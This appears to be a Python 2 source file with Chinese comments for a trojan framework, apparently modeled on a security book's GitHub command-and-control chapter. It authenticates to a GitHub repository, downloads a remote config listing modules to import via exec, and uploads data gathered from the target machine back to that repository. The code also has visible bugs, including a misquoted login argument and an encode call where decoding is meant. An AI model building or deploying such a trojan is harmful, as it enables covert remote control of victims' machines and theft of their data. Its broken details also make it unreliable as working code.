 # -*- coding: utf-8 -*-
 import json
 import base64
 import sys
 import time
 import imp
 import random
 import threading
 import Queue
 import os

 from github3 import login

 """
 木马主体框架，从GitHub上下载配置选项和运行的模块代码
 """

 trojan_id = "abc"  #唯一标识了木马文件

 trojan_config = "%s.json" %trojan_id
 data_path = "data/%s/" %trojan_id
 trojan_modules = []
 configured = False
 task_queue = Queue.Queue()

 def connect_to_github():
 	"""
 	连接github，对用户进行认证，获取当前的repo和branch的对象提供给其他函数使用
 	"""
 	gh = login(username="yourusername,"password = "yourpassword")
 	repo = gh.repository("yourusername","chapter7")
 	branch = repo.branch("master")

 	return gh,repo,branch

 def get_file_contents(filepath):
 	"""
 	从远程的repo中抓取文件，将文件内容读取到本地变量中
 	"""
 	gh,repo,branch = connect_to_github()
 	tree = branch.commit.commit.tree.recurse()

 	for filename in tree.tree:
 		if filepath in filename.path:
 			print "[*] Found file %s" %filepath
 			blob = repo.blob(filename._json_data['sha'])
 			return blob.content
 	return None


 def get_trojan_config():
 	"""
 	获得repo中的远程配置文件，木马解析其中的内容获得需要运行的模块名称
 	"""
 	global configured
 	config_json = get_file_contents(trojan_config)
 	config = json.loads(base64.b64encode(config_json))
 	configured = True

 	for task in config:
 		if task['module'] not in sys.modules:
 			exec("import %s" %task['module'])
 	return config

 def store_module_result(data):
 	"""
 	将从目标机器上手机的数据推送到repo中
 	"""
 	gh,repo,branch = connect_to_github()
 	remote_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,100000))
 	repo.create_file(remote_path,"Commit message",base64.b64encode(data))

 	return